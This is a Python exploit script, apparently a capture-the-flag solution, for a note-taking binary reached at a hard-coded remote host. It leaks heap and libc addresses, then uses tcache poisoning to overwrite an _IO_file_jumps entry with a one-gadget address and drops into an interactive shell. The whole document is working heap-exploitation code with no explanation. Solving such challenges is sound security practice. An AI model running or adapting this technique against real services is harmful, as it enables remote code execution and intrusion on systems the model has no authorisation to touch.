from ptrlib import *

def add(name, data):
    sock.sendlineafter("> ", "1")
    sock.sendafter("> ", name)
    sock.sendafter("> ", data)
def delete(name):
    sock.sendlineafter("> ", "2")
    sock.sendafter("> ", name)
def edit(name, data):
    sock.sendlineafter("> ", "3")
    sock.sendafter("> ", name)
    sock.sendafter("> ", data)
def view():
    sock.sendlineafter("> ", "4")

libc = ELF("./libc-2.31.so")
#sock = Process("./HNoteFixed")
#sock = Process("./DebugNote",
#               env={"ASAN_OPTIONS":"alloc_dealloc_mismatch=0"})
sock = Socket("nc 39.115.110.8 7777")

# leak heap
add("A", "A"*0x10)
add("B", "B"*0x10)
add("C", "C"*0x10)
delete("A")
add("C", "C"*0x10)
delete("B")
add("C", "X"*0x10)
view()
sock.recvlineafter("Content > ")
heap_base = u64(sock.recvlineafter("Content > ")) - 0x11f90
logger.info("heap = " + hex(heap_base))

# prepare libc address on heap
add("0"*0x20, "x"*0x10)
add("1"*0x20, "y"*0x10)
add("2"*0x20, p64(heap_base) + p64(heap_base)) # fake chunk

for i in range(0, 8):
    add(str(i)*0x10, "\x01"*0x80)
for i in range(0, 8):
    delete(str(i)*0x10)

# leak libc
edit("2"*0x20, p64(heap_base + 0x12890) + p64(heap_base + 0x12890))
view()
sock.recvuntil("X"*0x10)
libc_base = u64(sock.recvlineafter("Name > ")) - libc.main_arena() - 0x60
libc.set_base(libc_base)

# tcache poisoning
sock.recvuntil("Exit")
payload  = p64(heap_base + 0x11fd0) # 'x'*0x10
payload += p64(libc_base + 0x1ed4a0 + 0x28) # _IO_file_jumps->_IO_default_uflow
edit("2"*0x20, payload)
edit("x"*0x10, p64(libc_base + 0xe6c7e).rstrip(b'\x00'))

sock.interactive()
